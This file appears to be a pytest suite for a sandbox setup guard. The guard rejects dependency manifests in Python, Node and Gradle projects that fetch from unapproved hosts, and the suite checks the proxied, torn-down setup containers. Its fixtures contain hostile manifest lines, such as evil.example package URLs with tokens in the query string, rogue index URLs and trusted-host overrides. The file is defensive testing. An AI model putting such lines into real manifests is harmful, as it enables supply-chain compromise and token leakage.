"""The verifier setup's egress guard (services/dev/setup_guard.py).

Setup is the one sandbox phase with network, and it reads manifests the agent
edited. Pinned here: the manifest scanner refuses every fetch-from-elsewhere
pattern unless the project registry allows it, and every prepare_* call runs
its setup container on an internal network behind the egress proxy, with the
right allowlist, torn down afterwards. The real-docker evidence is in the PR.
"""

from __future__ import annotations

import json
import textwrap
from pathlib import Path

import pytest

from life_graph.config import settings
from life_graph.services.dev import sandbox, setup_guard, task_runtime
from life_graph.services.dev.sandbox import SandboxResult, SandboxUnavailableError
from life_graph.services.dev.setup_guard import SetupRefusedError


def _w(root: Path, rel: str, text: str) -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(textwrap.dedent(text).lstrip())
    return p


def _scan(root: Path, toolchain: str = "python", allow=None) -> list[str]:
    manifests = sandbox._GRADLE_MANIFESTS if toolchain == "jvm" else ()
    return setup_guard.scan(root, toolchain, allow, gradle_manifests=manifests)


# ── Python: requirements files ─────────────────────────────────


@pytest.mark.parametrize(
    "line",
    [
        "x @ https://evil.example/?t=TOKEN",
        "x[extra] @ https://evil.example/x-1.0.tar.gz ; python_version > '3.8'",
        "https://evil.example/x-1.0.tar.gz",
        "git+https://github.com/a/b.git#egg=b",
        "b @ git+ssh://git@github.com/a/b.git",
        "git@github.com:a/b.git",
        "-e git+https://github.com/a/b#egg=b",
        "--index-url https://evil.example/simple",
        "-i https://evil.example/simple",
        "-ihttps://evil.example/simple",
        "--extra-index-url=https://evil.example/simple",
        "--find-links https://evil.example/wheels",
        "-f https://evil.example/wheels",
        "--index-url http://pypi.org/simple",  # not https
        "--trusted-host evil.example",
        "x @ https://${HOST}/x.whl",
        "x @ https://pypi.org:8443/x.whl",
        "x @ file:///etc/x",
        "-e ../outside",
        "/abs/pkg",
        "~/pkg",
        "-r ../outside.txt",
        "-r https://evil.example/req.txt",
        "x @ https://files.pythonhosted.org/x.whl",  # a direct URL, even to the registry
    ],
)
def test_requirements_patterns_are_refused(tmp_path, line):
    _w(tmp_path, "requirements.txt", f"httpx>=0.27\n{line}\n")
    assert _scan(tmp_path), line


def test_a_url_hidden_in_an_included_file_is_refused(tmp_path):
    _w(tmp_path, "requirements-dev.txt", "-r requirements/extra.txt\npytest\n")
    _w(tmp_path, "requirements/extra.txt", "x @ https://evil.example/x.whl\n")
    found = _scan(tmp_path)
    assert any("evil.example" in f for f in found)


def test_other_requirements_files_are_scanned_too(tmp_path):
    _w(tmp_path, "requirements-ci.txt", "--extra-index-url https://evil.example/simple\n")
    _w(tmp_path, "constraints.txt", "y @ https://evil.example/y.whl\n")
    assert len(_scan(tmp_path)) == 2


def test_clean_requirements_pass(tmp_path):
    _w(tmp_path, "local_pkg/setup.py", "")
    _w(
        tmp_path,
        "requirements.txt",
        """
        # a comment with https://evil.example in it
        httpx>=0.27  # trailing comment
        pytest ; python_version > "3.8"
        pkg==1.0 --hash=sha256:abc
        -e .
        ./local_pkg
        --index-url https://pypi.org/simple
        -r requirements-dev.txt
        """,
    )
    _w(tmp_path, "requirements-dev.txt", "-r requirements.txt\nruff\n")
    assert _scan(tmp_path) == []


# ── Python: pyproject.toml, uv.toml, uv.lock ───────────────────


@pytest.mark.parametrize(
    "toml",
    [
        '[project]\nname="p"\ndependencies=["x @ https://evil.example/x.whl"]\n',
        '[project]\nname="p"\n[project.optional-dependencies]\ndev=["y @ git+https://github.com/a/b"]\n',
        '[dependency-groups]\ndev=["z @ https://evil.example/z.whl"]\n',
        '[build-system]\nrequires=["hatchling @ https://evil.example/h.whl"]\n',
        '[tool.uv.sources]\nx = { git = "https://github.com/a/b" }\n',
        '[tool.uv.sources]\nx = { url = "https://evil.example/x.tar.gz" }\n',
        '[tool.uv.sources]\nx = { path = "../outside" }\n',
        '[tool.uv.sources]\nx = [{ path = "/abs/x" }]\n',
        '[[tool.uv.index]]\nname="evil"\nurl = "https://evil.example/simple"\n',
        '[tool.uv]\nindex-url = "https://evil.example/simple"\n',
        '[tool.uv]\nextra-index-url = ["https://evil.example/simple"]\n',
        '[tool.uv]\nfind-links = ["https://evil.example/wheels"]\n',
        '[tool.uv]\nallow-insecure-host = ["evil.example"]\n',
        '[tool.uv]\noverride-dependencies = ["x @ https://evil.example/x.whl"]\n',
        '[tool.uv.pip]\nindex-url = "https://evil.example/simple"\n',
    ],
)
def test_pyproject_patterns_are_refused(tmp_path, toml):
    _w(tmp_path, "pyproject.toml", toml)
    assert _scan(tmp_path), toml


def test_uv_toml_index_is_refused(tmp_path):
    _w(tmp_path, "uv.toml", 'index-url = "https://evil.example/simple"\n')
    assert _scan(tmp_path)


def test_workspace_member_sources_are_scanned(tmp_path):
    _w(tmp_path, "pyproject.toml", '[tool.uv.workspace]\nmembers = ["packages/*"]\n')
    _w(
        tmp_path,
        "packages/a/pyproject.toml",
        '[tool.uv.sources]\nx = { url = "https://e.example/x" }\n',
    )
    assert any("packages/a/pyproject.toml" in f for f in _scan(tmp_path))


@pytest.mark.parametrize(
    "package",
    [
        'source = { git = "https://github.com/a/b?rev=x#abc" }',
        'source = { url = "https://evil.example/x.tar.gz" }',
        'source = { registry = "https://evil.example/simple" }',
        'source = { path = "../outside" }',
        'source = { registry = "https://pypi.org/simple" }\n'
        'sdist = { url = "https://evil.example/x-1.tar.gz", hash = "sha256:0" }',
        'source = { registry = "https://pypi.org/simple" }\n'
        'wheels = [{ url = "https://evil.example/x-1-py3-none-any.whl", hash = "sha256:0" }]',
        'source = { editable = "." }\n'
        '[package.metadata]\nrequires-dist = [{ name = "y", url = "https://evil.example/y.whl" }]',
    ],
)
def test_uv_lock_patterns_are_refused(tmp_path, package):
    _w(tmp_path, "uv.lock", f'version = 1\n[[package]]\nname = "x"\nversion = "1"\n{package}\n')
    assert _scan(tmp_path), package


PULSE_LIKE_PYPROJECT = """
[project]
name = "pulse"
version = "0.1.0"
dependencies = ["httpx>=0.27"]
[project.optional-dependencies]
dev = ["pytest>=9.0", "ruff>=0.16"]
[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"
[[tool.uv.index]]
name = "pypi"
url = "https://pypi.org/simple"
[tool.uv.sources]
lib = { workspace = true }
local = { path = "packages/local" }
"""

PULSE_LIKE_LOCK = """
version = 1
[[package]]
name = "httpx"
version = "0.28.1"
source = { registry = "https://pypi.org/simple" }
sdist = { url = "https://files.pythonhosted.org/packages/x/httpx-0.28.1.tar.gz", hash = "sha256:0" }
wheels = [{ url = "https://files.pythonhosted.org/packages/x/httpx-0.28.1-py3-none-any.whl", hash = "sha256:0" }]
[[package]]
name = "pulse"
version = "0.1.0"
source = { editable = "." }
[package.metadata]
requires-dist = [{ name = "httpx", specifier = ">=0.27" }]
"""


def test_a_clean_python_project_passes(tmp_path):
    _w(tmp_path, "pyproject.toml", PULSE_LIKE_PYPROJECT)
    _w(tmp_path, "uv.lock", PULSE_LIKE_LOCK)
    assert _scan(tmp_path) == []


def test_the_real_pulse_manifests_pass():
    pulse = Path("/mnt/h/DevTools/Projects/pulse")
    if not (pulse / "uv.lock").is_file():
        pytest.skip("pulse checkout not on this machine")
    assert _scan(pulse) == []


# ── Node ───────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "spec",
    [
        "https://evil.example/x.tgz",
        "git+https://github.com/a/b.git",
        "git://github.com/a/b.git",
        "git+ssh://git@github.com/a/b.git",
        "github:a/b",
        "gitlab:a/b",
        "a/b",
        "a/b#v1",
        "file:../outside",
        "file:/abs/x",
    ],
)
def test_package_json_patterns_are_refused(tmp_path, spec):
    _w(tmp_path, "package.json", json.dumps({"dependencies": {"x": spec}}))
    assert _scan(tmp_path, "node"), spec


def test_npm_overrides_are_scanned(tmp_path):
    pkg = {"overrides": {"a": {"b": "https://evil.example/b.tgz"}}}
    _w(tmp_path, "package.json", json.dumps(pkg))
    assert _scan(tmp_path, "node")


@pytest.mark.parametrize(
    "entry",
    [
        {"version": "1.0.0", "resolved": "https://evil.example/x-1.0.0.tgz"},
        {"version": "1.0.0", "resolved": "git+ssh://git@github.com/a/b.git#abc"},
        {"version": "1.0.0", "resolved": "http://registry.npmjs.org/x/-/x-1.0.0.tgz"},
        {"version": "file:../outside", "resolved": "file:../outside"},
    ],
)
def test_lockfile_resolved_elsewhere_is_refused(tmp_path, entry):
    _w(tmp_path, "package.json", json.dumps({"dependencies": {"x": "^1.0.0"}}))
    lock = {"lockfileVersion": 3, "packages": {"": {}, "node_modules/x": entry}}
    _w(tmp_path, "package-lock.json", json.dumps(lock))
    assert _scan(tmp_path, "node"), entry


def test_lockfile_v1_nesting_is_scanned(tmp_path):
    _w(tmp_path, "package.json", "{}")
    lock = {
        "lockfileVersion": 1,
        "dependencies": {
            "a": {
                "version": "1.0.0",
                "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz",
                "dependencies": {"b": {"version": "1.0.0", "resolved": "https://e.example/b.tgz"}},
            }
        },
    }
    _w(tmp_path, "npm-shrinkwrap.json", json.dumps(lock))
    assert _scan(tmp_path, "node")


def test_a_clean_node_project_passes(tmp_path):
    pkg = {
        "dependencies": {
            "vitest": "^2.0.0",
            "alias": "npm:@scope/real@^1.0.0",
            "ws": "workspace:*",
        },
        "devDependencies": {"typescript": "latest"},
        "workspaces": ["packages/a"],
    }
    lock = {
        "lockfileVersion": 3,
        "packages": {
            "": {"dependencies": {"vitest": "^2.0.0"}},
            "node_modules/vitest": {
                "version": "2.0.0",
                "resolved": "https://registry.npmjs.org/vitest/-/vitest-2.0.0.tgz",
            },
            "node_modules/a": {"resolved": "packages/a", "link": True},
        },
    }
    _w(tmp_path, "package.json", json.dumps(pkg))
    _w(tmp_path, "package-lock.json", json.dumps(lock))
    assert _scan(tmp_path, "node") == []


# ── JVM ────────────────────────────────────────────────────────


def test_gradle_wrapper_from_elsewhere_is_refused(tmp_path):
    _w(
        tmp_path,
        "gradle/wrapper/gradle-wrapper.properties",
        "distributionUrl=https\\://evil.example/gradle-8.9-bin.zip\n",
    )
    assert _scan(tmp_path, "jvm")


def test_gradle_repository_elsewhere_is_refused(tmp_path):
    _w(tmp_path, "settings.gradle.kts", 'repositories { maven("https://jitpack.io") }\n')
    assert _scan(tmp_path, "jvm")


def test_a_clean_gradle_project_passes(tmp_path):
    _w(
        tmp_path,
        "gradle/wrapper/gradle-wrapper.properties",
        "distributionUrl=https\\://services.gradle.org/distributions/gradle-8.9-bin.zip\n",
    )
    _w(tmp_path, "settings.gradle.kts", "repositories { google(); mavenCentral() }\n")
    _w(tmp_path, "app/build.gradle.kts", 'plugins { id("com.android.application") }\n')
    assert _scan(tmp_path, "jvm") == []


# ── The registry's sandbox_setup_allow ─────────────────────────


def test_registry_allowed_hosts_pass(tmp_path):
    _w(
        tmp_path,
        "requirements.txt",
        "x @ https://git.corp.example/x.whl\n--extra-index-url https://pkgs.corp.example/simple\n",
    )
    assert _scan(tmp_path)
    assert _scan(tmp_path, allow=["git.corp.example", "pkgs.corp.example"]) == []
    assert _scan(tmp_path, allow="https://git.corp.example, pkgs.corp.example") == []


def test_registry_allows_outside_paths_only_with_the_path_token(tmp_path):
    _w(tmp_path, "pyproject.toml", '[tool.uv.sources]\nx = { path = "../lib" }\n')
    assert _scan(tmp_path, allow=["lib.example"])
    assert _scan(tmp_path, allow=["path"]) == []


@pytest.mark.parametrize("bad", ["https://x.example/path", "not a host", "localhost", "*.example"])
def test_an_unreadable_allow_entry_refuses_setup(tmp_path, bad):
    with pytest.raises(SetupRefusedError):
        _scan(tmp_path, allow=[bad])


def test_egress_hosts_are_the_toolchain_registries_plus_the_registry_allow():
    assert setup_guard.egress_hosts("python", None) == ("files.pythonhosted.org", "pypi.org")
    assert setup_guard.egress_hosts("node", "a.example") == ("a.example", "registry.npmjs.org")
    assert "services.gradle.org" in setup_guard.egress_hosts("jvm", None)
    assert "path" not in setup_guard.egress_hosts("python", ["path"])


def test_a_symlinked_or_broken_manifest_is_refused(tmp_path):
    (tmp_path / "real.txt").write_text("x @ https://evil.example/x.whl\n")
    (tmp_path / "requirements.txt").symlink_to(tmp_path / "real.txt")
    assert any("symlink" in f for f in _scan(tmp_path))
    (tmp_path / "requirements.txt").unlink()
    _w(tmp_path, "pyproject.toml", "[project\n")
    assert any("TOML" in f for f in _scan(tmp_path))


def test_the_refusal_is_a_sandbox_error_and_never_echoes_the_query(tmp_path):
    _w(tmp_path, "requirements.txt", "x @ https://evil.example/?t=SECRET-TOKEN\n")
    with pytest.raises(SandboxUnavailableError) as exc:
        setup_guard.check(tmp_path, "python")
    assert "evil.example" in str(exc.value)
    assert "SECRET-TOKEN" not in str(exc.value)


# ── Wiring: prepare_* behind the egress proxy ──────────────────


class FakeDocker:
    """Both sandbox._exec and the runtime's runner; answers like a healthy daemon."""

    def __init__(self, setup_rc: int = 0, proxy_rc: int = 0):
        self.calls: list[list[str]] = []
        self.setup_rc = setup_rc
        self.proxy_rc = proxy_rc

    async def __call__(self, argv, timeout=None, *, container=None, env=None, on_stdout_line=None):
        self.calls.append(list(argv))
        if argv[:3] == ["docker", "image", "inspect"]:
            return SandboxResult(0, "sha256:abc\n", "")
        if argv[:3] == ["docker", "network", "inspect"] and "--format" in argv:
            return SandboxResult(0, "true|isolated\n", "")
        if argv[:2] == ["docker", "run"] and "--detach" in argv:
            return SandboxResult(self.proxy_rc, "", "" if not self.proxy_rc else "boom")
        if argv[:2] == ["docker", "run"]:
            self._fake_output(argv)
            return SandboxResult(self.setup_rc, "", "" if not self.setup_rc else "failed")
        return SandboxResult(0, "", "")

    @staticmethod
    def _fake_output(argv):
        for i, a in enumerate(argv):
            if argv[i - 1] == "-v" and a.endswith(":/deps"):
                Path(a.rsplit(":", 1)[0], "node_modules").mkdir(parents=True, exist_ok=True)
            if argv[i - 1] == "-v" and a.endswith(":/gradle"):
                Path(a.rsplit(":", 1)[0], "wrapper", "dists").mkdir(parents=True, exist_ok=True)

    def setup_run(self) -> list[str]:
        return next(c for c in self.calls if c[:2] == ["docker", "run"] and "--detach" not in c)

    def proxy_run(self) -> list[str]:
        return next(c for c in self.calls if c[:2] == ["docker", "run"] and "--detach" in c)

    def verbs(self) -> list[str]:
        return [" ".join(c[1:3]) for c in self.calls]


@pytest.fixture
def docker(monkeypatch, tmp_path):
    fake = FakeDocker()
    monkeypatch.setattr(settings, "verifier_sandbox", "docker")
    monkeypatch.setattr(settings, "verifier_sandbox_cache_dir", str(tmp_path / "envs"))
    monkeypatch.setattr(sandbox, "_exec", fake)
    monkeypatch.setattr(task_runtime, "runtime", task_runtime.DockerTaskRuntime(fake))
    return fake


def _origins(argv: list[str]) -> list[str]:
    return [argv[i + 1] for i, a in enumerate(argv) if a == "--allowed-origin"]


async def test_python_setup_runs_on_the_internal_network_behind_the_proxy(docker, tmp_path):
    work = tmp_path / "w"
    _w(work, "pyproject.toml", PULSE_LIKE_PYPROJECT)
    await sandbox.prepare_env(work, "uv sync --frozen --extra dev")

    create = next(c for c in docker.calls if c[:3] == ["docker", "network", "create"])
    assert "--internal" in create
    net = create[-1]
    assert net.startswith("lg-rt-net-")
    proxy = docker.proxy_run()
    assert _origins(proxy) == ["https://files.pythonhosted.org", "https://pypi.org"]
    assert proxy[proxy.index("--allowed-port") + 1] == "443"

    setup = docker.setup_run()
    assert setup[setup.index("--network") + 1] == net
    assert "none" not in setup[setup.index("--network") + 1]
    proxy_name = proxy[proxy.index("--name") + 1]
    env = {setup[i + 1] for i, a in enumerate(setup) if a == "-e"}
    assert f"HTTPS_PROXY=http://{proxy_name}:8080" in env
    assert "life-graph.runtime.task=verifier-setup" in setup
    assert f"{work}:/work:ro" in setup  # still read-only
    assert setup[setup.index("--name") + 1].startswith("lg-verify-setup-")
    # Everything removed afterwards: setup container, proxy, network.
    tail = docker.verbs()[-3:]
    assert tail == ["rm -f", "rm -f", "network rm"]


async def test_registry_allow_reaches_the_proxy_allowlist(docker, tmp_path):
    work = tmp_path / "w"
    work.mkdir()
    await sandbox.prepare_env(work, None, allow=["pkgs.corp.example"])
    assert "https://pkgs.corp.example" in _origins(docker.proxy_run())


async def test_refused_manifests_never_reach_docker_or_the_cache(docker, tmp_path):
    work = tmp_path / "w"
    _w(work, "requirements.txt", "x @ https://evil.example/?t=T\n")
    # Even an env already cached for exactly these manifests is not handed out.
    key = sandbox._env_key(work, "sha256:abc", sandbox.DEFAULT_SETUP)
    (tmp_path / "envs" / key).mkdir(parents=True)
    with pytest.raises(SetupRefusedError):
        await sandbox.prepare_env(work)
    assert docker.calls == []


async def test_failed_setup_still_tears_the_egress_down(docker, tmp_path):
    docker.setup_rc = 1
    work = tmp_path / "w"
    work.mkdir()
    with pytest.raises(SandboxUnavailableError, match="setup failed"):
        await sandbox.prepare_env(work)
    assert docker.verbs()[-3:] == ["rm -f", "rm -f", "network rm"]
    assert list((tmp_path / "envs").iterdir()) == []


async def test_no_proxy_means_no_setup(docker, tmp_path):
    docker.proxy_rc = 1
    work = tmp_path / "w"
    work.mkdir()
    with pytest.raises(SandboxUnavailableError, match="egress proxy"):
        await sandbox.prepare_env(work)
    assert not any(c[:2] == ["docker", "run"] and "--detach" not in c for c in docker.calls)
    assert docker.verbs()[-1] == "network rm"


async def test_a_network_that_is_not_internal_means_no_setup(docker, tmp_path, monkeypatch):
    real = docker.__call__

    async def leaky(argv, timeout=None, **kw):
        if argv[:3] == ["docker", "network", "inspect"]:
            return SandboxResult(0, "false|default\n", "")
        return await real(argv, timeout, **kw)

    rt = task_runtime.DockerTaskRuntime(leaky)
    monkeypatch.setattr(task_runtime, "runtime", rt)
    work = tmp_path / "w"
    work.mkdir()
    with pytest.raises(SandboxUnavailableError, match="not internal"):
        await sandbox.prepare_env(work)
    assert not any(c[:2] == ["docker", "run"] for c in docker.calls)


async def test_node_setup_points_npm_at_the_proxy(docker, tmp_path):
    work = tmp_path / "w"
    _w(work, "package.json", json.dumps({"dependencies": {"vitest": "^2"}}))
    await sandbox.prepare_node_env(work)
    assert _origins(docker.proxy_run()) == ["https://registry.npmjs.org"]
    setup = docker.setup_run()
    env = [setup[i + 1] for i, a in enumerate(setup) if a == "-e"]
    assert any(e.startswith("npm_config_https_proxy=http://lg-rt-egress-") for e in env)
    assert setup[setup.index("--network") + 1].startswith("lg-rt-net-")


async def test_node_refusal(docker, tmp_path):
    work = tmp_path / "w"
    _w(work, "package.json", json.dumps({"dependencies": {"x": "github:a/b"}}))
    with pytest.raises(SetupRefusedError):
        await sandbox.prepare_node_env(work)
    assert docker.calls == []


async def test_gradle_setup_gives_java_the_proxy(docker, tmp_path):
    work = tmp_path / "w"
    _w(work, "gradlew", "#!/bin/sh\n")
    await sandbox.prepare_gradle_env(work)
    assert "https://services.gradle.org" in _origins(docker.proxy_run())
    setup = docker.setup_run()
    env = [setup[i + 1] for i, a in enumerate(setup) if a == "-e"]
    opts = next(e for e in env if e.startswith("JAVA_TOOL_OPTIONS="))
    assert "-Duser.home=/tmp" in opts
    assert "-Dhttps.proxyHost=lg-rt-egress-" in opts and "-Dhttps.proxyPort=8080" in opts


async def test_gradle_refusal(docker, tmp_path):
    work = tmp_path / "w"
    _w(work, "gradlew", "#!/bin/sh\n")
    _w(work, "build.gradle.kts", 'repositories { maven { url = uri("https://evil.example/m2") } }')
    with pytest.raises(SetupRefusedError):
        await sandbox.prepare_gradle_env(work)


async def test_a_refusal_makes_the_verifier_inconclusive_not_passed(docker, tmp_path):
    from life_graph.services.dev import verifiers as v

    _w(tmp_path, "requirements.txt", "x @ https://evil.example/x.whl\n")
    passed, evidence = await v._verify_tests_pass(tmp_path, {})
    assert passed is None
    assert "setup refused" in evidence["note"]


async def test_empty_allowlist_never_starts_a_proxy(docker):
    with pytest.raises(SandboxUnavailableError, match="empty allowlist"):
        async with task_runtime.runtime.setup_egress(()):
            pass
    assert docker.calls == []


# ── Sweep of crashed setups ────────────────────────────────────


async def test_sweep_keeps_young_setups_and_removes_old_ones(monkeypatch, tmp_path):
    # Keep the sweep's credentials pass inside tmp_path.
    monkeypatch.setattr(settings, "verifier_sandbox_cache_dir", str(tmp_path / "envs"))
    young = "2999-01-01 00:00:00 +0000 UTC"
    old = "2000-01-01 00:00:00 +0000 UTC"
    fake_ps = SandboxResult(
        0,
        f"lg-verify-setup-a|verifier-setup|{young}\n"
        f"lg-verify-setup-b|verifier-setup|{old}\n"
        "lg-verify-setup-c|verifier-setup|\n",
        "",
    )
    removed: list[str] = []

    async def runner(argv, *, timeout, container=None, env=None, on_stdout_line=None):
        if argv[:2] == ["docker", "ps"]:
            return fake_ps
        if argv[:3] == ["docker", "network", "ls"]:
            return SandboxResult(0, "", "")
        if argv[:2] == ["docker", "rm"]:
            removed.append(argv[-1])
        return SandboxResult(0, "", "")

    assert tmp_path in sandbox.driver_creds_root().parents
    report = await task_runtime.DockerTaskRuntime(runner).sweep(set(), creds_max_age_seconds=1)
    assert removed == ["lg-verify-setup-b"]
    assert report["containers"] == ["lg-verify-setup-b"]
